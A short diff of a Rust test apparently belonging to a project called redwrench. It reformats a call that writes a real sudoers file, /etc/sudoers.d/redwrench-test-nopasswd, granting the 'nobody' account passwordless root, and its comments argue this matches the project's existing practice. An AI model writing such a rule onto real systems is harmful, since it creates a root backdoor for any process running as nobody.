@@ -731,11 +731,8 @@ mod tests {
         // executor.rs), so creating a real sudoers file here is consistent
         // with that established practice, not a new requirement.
         let sudoers_path = "/etc/sudoers.d/redwrench-test-nopasswd";
-        std::fs::write(
-            sudoers_path,
-            "nobody ALL=(ALL) NOPASSWD: ALL\n",
-        )
-        .expect("this test requires root, matching this project's other Fedora-only tests");
+        std::fs::write(sudoers_path, "nobody ALL=(ALL) NOPASSWD: ALL\n")
+            .expect("this test requires root, matching this project's other Fedora-only tests");
         // sudoers.d files must be mode 0440 or sudo ignores them with a
         // warning rather than an error, which would make this test silently
         // meaningless rather than fail loudly.
